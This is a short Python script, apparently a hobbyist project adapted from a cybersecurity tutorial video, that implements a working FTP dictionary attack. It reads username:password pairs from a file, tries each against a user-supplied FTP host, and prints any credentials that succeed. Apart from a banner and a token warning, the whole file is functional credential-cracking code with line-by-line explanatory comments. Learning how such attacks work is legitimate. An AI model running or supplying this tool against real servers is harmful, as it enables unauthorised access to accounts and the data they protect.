## Simple FTP Dictionary Attack Tool
## This code is based on the Vinsloev Academy video "Python Cybersecurity - Brute Force FTP"found at https://www.youtube.com/watch?v=0tZhMZn78Yw&list=PLR0bgGon_WTIjs0lyCAUp3v1qAraXCJcH
## Several modifications have been made


import pyfiglet  
import ftplib

banner1 = pyfiglet.figlet_format("S I M P L E")
banner2 = pyfiglet.figlet_format("FTP CRACKER")
print("islasec's")
print(banner1)
print(banner2)
print("This cracker requires a credentials file wherein the username and password should be formatted as login:password on a seperate line like this:")
print("user:pass")
print("joe:qwerty")
print("admin:123abc")
print("Do not use this for EVIL")


hostname = input('[+] Enter FTP Hostname/IP: ')     	# Ask user for IP
creds = input('[+] Enter the password file to use: ')   # Ask for the name of the password file


def BFLogin(hostname, creds):			# Create a function that inputs the password file into ftplib
	passlist = open(creds, 'r')             # here we're opening the password list in read mode 'r'
	for line in passlist.readlines():       # For Loop that reads the names in the password file 
		username = line.split(':')[0]	# Split the user/login part of the credentials from the password, weŕe using the 1st element in the line so we use [0] 
		password = line.split(':')[1].strip('\n')	## Split the password part from the credentials from the logig, we're using the 2nd element in that line so we use [1] .strip\n strips out the next new line, basically moving the next credential set up
		print("[+] Attempting: " + str(username) +":" + str(password))  # Print to screen that an attempt is being made to crack the FTP for each credential set
		try:					# Within the for loop we need to add the actual connection to the FTP server
			ftp = ftplib.FTP(hostname)      # This gives ftplib the IP address of the FTP server to crack
			ftp.login(username, password)	# This gives ftplib the login and password from the password list 
			print("FTP Cracked! -->" + str(username) +":" + str(password))  # If successful, let us know and print credentials that worked
			ftp.quit()  			# Exit the program 
			return (username, password)  	 # This is what is 'returned' by the function. It's returning a tuple of (username, password).
		except Exception:   # Exception will be raised, aka the program won't result in an error, if the user inputs something other than what is expected.
			pass			# Move along to the next one
			print('---> Nope! Not that one...')				# Let user know we didn't find the correct credentials
		
BFLogin(hostname, creds) # executes function			
